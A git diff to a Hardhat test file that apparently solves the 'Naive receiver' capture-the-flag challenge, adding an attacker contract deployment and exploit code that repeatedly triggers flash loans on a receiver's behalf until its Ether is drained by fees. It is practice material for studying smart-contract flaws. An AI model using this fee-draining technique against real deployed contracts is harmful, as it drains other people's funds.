@@ -1,5 +1,6 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+// const NaiveReceiverAttacker = contract.fromArtifact('NaiveReceiverAttacker');
 
 describe('[Challenge] Naive receiver', function () {
     let deployer, user, attacker;
@@ -17,6 +18,8 @@ describe('[Challenge] Naive receiver', function () {
         const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
         const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
 
+        const NaiveReceiverAttacker = await ethers.getContractFactory('NaiveReceiverAttacker', deployer);
+
         this.pool = await LenderPoolFactory.deploy();
         await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
         
@@ -27,15 +30,22 @@ describe('[Challenge] Naive receiver', function () {
         await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
         
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
+
+        this.attacker = await NaiveReceiverAttacker.deploy();
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
-        var fee = await this.pool.fixedFee();
-        console.log("this.pool.fixedFee()", fee)
-
-        while ((await ethers.provider.getBalance(this.receiver.address)).gte(fee)){
-            await this.pool.flashLoan(this.receiver.address, ETHER_IN_POOL);
+        var one_tx = true
+        if(one_tx==true){
+            // this.attacker has a function "attack" that directly call multiple time this.poll flash loan
+            // After few calls (10), this.receiver has not anymore token.
+            await this.attacker.attack(this.pool.address, this.receiver.address)
+        }else{
+            var fee = await this.pool.fixedFee();
+            while ((await ethers.provider.getBalance(this.receiver.address)).gte(fee)){
+                await this.pool.flashLoan(this.receiver.address, ETHER_IN_POOL);
+            }
         }
     });
 
